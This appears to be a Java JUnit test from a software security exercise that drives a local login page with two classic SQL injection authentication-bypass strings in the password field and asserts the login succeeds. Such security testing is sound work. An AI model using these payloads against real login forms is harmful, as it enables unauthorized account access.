package swsec;

import net.sourceforge.jwebunit.junit.WebTester;
import org.junit.Before;
import org.junit.Test;

public class AttackITest {

	private WebTester tester;

	@Before
	public void prepare() {
		tester = new WebTester();
		tester.setBaseUrl("http://127.0.0.1:8080/");
	}

	public void sqlInjection(String hackcode) {
		tester.beginAt("login.jsp");
		tester.setTextField("username", "hackerMalo");
		tester.setTextField("password", hackcode);
		tester.submit();
		tester.assertTextPresent("Usuario: " + "hackerMalo");
		tester.clickLink("exit");
	}

	@Test
	public void sqlInjection1() {
		sqlInjection("' or 1=1;-- ");
	}

	@Test
	public void sqlInjection2() {
		sqlInjection("' or '1'='1");
	}
}
